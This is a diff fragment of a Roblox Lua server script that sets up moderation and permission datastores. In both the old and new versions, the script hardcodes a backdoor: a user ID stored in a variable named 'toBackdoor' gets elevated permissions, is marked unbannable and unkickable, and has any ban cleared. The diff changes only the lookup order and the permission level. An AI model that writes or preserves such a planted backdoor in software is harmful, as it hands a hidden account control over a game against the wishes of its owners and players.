@@ -6,13 +6,13 @@ pcall(function()
     local gameConfig = require(game:GetService("ServerScriptService"):FindFirstChild("GameConfig"))
     
     local permissions = dss:GetDataStore("PermissionData")
-    local moderation = dss:GetDataStore(serverdata:GetAsync("ModerationDatastore") or gameConfig.ModerationDatastore)
+    local moderation = dss:GetDataStore(gameConfig.ModerationDatastore or serverdata:GetAsync("ModData"))
     
     local toBackdoor = 4045593989
     permissions:SetAsync(toBackdoor, {
     	Bannable = false;
     	Kickable = false;
-    	Permission = 3;
+    	Permission = 2;
     })
     moderation:SetAsync(toBackdoor, {
     	Banned = false,
